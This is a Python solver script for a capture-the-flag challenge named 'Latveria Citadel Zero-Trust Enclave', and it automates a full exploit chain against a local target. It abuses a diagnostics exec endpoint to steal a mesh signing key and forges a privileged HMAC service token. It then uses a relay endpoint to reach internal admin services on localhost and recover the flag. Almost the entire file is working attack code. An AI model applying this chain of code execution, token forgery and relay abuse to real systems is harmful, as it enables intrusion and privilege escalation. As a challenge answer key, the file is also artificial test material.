#!/usr/bin/env python3
"""
Latveria Citadel Zero-Trust Enclave (X10) — Automated Solve Script
Executes full exploit chain against the target:
Gateway -> Low-Trust App -> Trust Discovery -> Context Reproduction -> Trusted Service -> Admin -> Flag
"""

import argparse
import base64
import hashlib
import hmac
import json
import sys
import time
import requests


def solve(target_url: str) -> str:
    base = target_url.rstrip("/")
    print(f"[*] Target Base URL: {base}")

    # Stage 1: Public Gateway Connectivity
    print("[+] Stage 1: Connecting to Public Gateway...")
    r = requests.get(f"{base}/api/v1/topology", timeout=5)
    r.raise_for_status()
    topo = r.json()
    print(f"    Gateway Active: {topo.get('challenge_name')} (ID: {topo.get('challenge_id')})")

    # Stage 2: Low-Trust Application Access & Diagnostic Inspection
    print("[+] Stage 2: Interacting with Low-Trust Application via Gateway...")
    r = requests.get(f"{base}/api/v1/telemetry/status", timeout=5)
    r.raise_for_status()
    print(f"    Low-Trust App Status: {r.json().get('status')} (Tier: {r.json().get('tier')})")

    # Stage 3: Discover Trust Assumption & Extract Mesh Key
    print("[+] Stage 3: Executing diagnostic inspection to extract mesh configuration...")
    payload_cmd = {
        "script": "import json\nprint(json.dumps(get_mesh_config()))"
    }
    r = requests.post(f"{base}/api/v1/diagnostics/exec", json=payload_cmd, timeout=5)
    r.raise_for_status()
    res_data = r.json()
    if res_data.get("status") != "SUCCESS":
        raise RuntimeError(f"Diagnostic execution failed: {res_data}")

    mesh_config = json.loads(res_data["stdout"].strip())
    mesh_key = mesh_config["mesh_signing_key"].encode("utf-8")
    print(f"    Discovered Mesh Signing Key: {mesh_config['mesh_signing_key'][:16]}...")
    print(f"    Discovered Authorized Identity: {mesh_config['authorized_core_identity']['service_id']}")

    # Stage 4: Reproduce Trusted Request Context (Forge core-orchestrator token)
    print("[+] Stage 4: Reproducing Trusted Request Context for 'core-orchestrator'...")
    now = int(time.time())
    forged_claims = {
        "service_id": "core-orchestrator",
        "role": "citadel-orchestrator",
        "tier": "autonomous-kernel",
        "capabilities": ["core:admin", "vault:unseal", "system:override"],
        "trust_domain": mesh_config.get("mesh_domain", "latveria.citadel.mesh"),
        "iat": now,
        "exp": now + 3600,
        "nonce": "solver_exploit_nonce_1337"
    }

    payload_json = json.dumps(forged_claims, separators=(',', ':'), sort_keys=True)
    payload_b64 = base64.urlsafe_b64encode(payload_json.encode("utf-8")).decode("utf-8").rstrip("=")
    sig = hmac.new(mesh_key, payload_b64.encode("utf-8"), hashlib.sha256).hexdigest()
    forged_token = f"{payload_b64}.{sig}"
    print(f"    Forged Token Generated: {forged_token[:32]}...")

    # Stage 5: Reach Trusted Internal Service via Mesh Relay
    print("[+] Stage 5: Reaching Trusted Internal Service (Core Engine) with forged assertion...")
    relay_payload = {
        "target_url": "http://127.0.0.1:8082/api/v1/core/request-admin-ticket",
        "assertion_token": forged_token,
        "method": "POST"
    }
    r = requests.post(f"{base}/api/v1/relay/dispatch", json=relay_payload, timeout=5)
    r.raise_for_status()
    core_resp = r.json()
    admin_ticket = core_resp["response"].get("admin_ticket")
    if not admin_ticket:
        raise RuntimeError(f"Failed to obtain admin ticket: {core_resp}")
    print(f"    Admin Grant Ticket Received: {admin_ticket}")

    # Stage 6: Reach Admin Service & Unseal Sovereign Flag
    print("[+] Stage 6: Unsealing Citadel Sovereign Vault with Admin Ticket...")
    unseal_payload = {
        "target_url": "http://127.0.0.1:8083/api/v1/admin/unseal",
        "assertion_token": forged_token,
        "payload": {"admin_ticket": admin_ticket},
        "method": "POST"
    }
    r = requests.post(f"{base}/api/v1/relay/dispatch", json=unseal_payload, timeout=5)
    r.raise_for_status()
    vault_resp = r.json()
    flag = vault_resp["response"].get("flag")
    if not flag:
        raise RuntimeError(f"Vault unseal failed: {vault_resp}")

    print(f"[!] SUCCESS! Recovered Flag: {flag}")
    return flag


def main():
    parser = argparse.ArgumentParser(description="X10 Challenge Automated Solver")
    parser.add_argument("--target", default="http://127.0.0.1:8080", help="Target Gateway URL")
    args = parser.parse_args()

    try:
        flag = solve(args.target)
        if not flag.startswith("YUVA{"):
            print("[-] Error: Recovered flag does not match expected format!")
            sys.exit(1)
        print("[+] Exploit verification complete: PASS")
        sys.exit(0)
    except Exception as e:
        print(f"[-] Exploit failed with error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
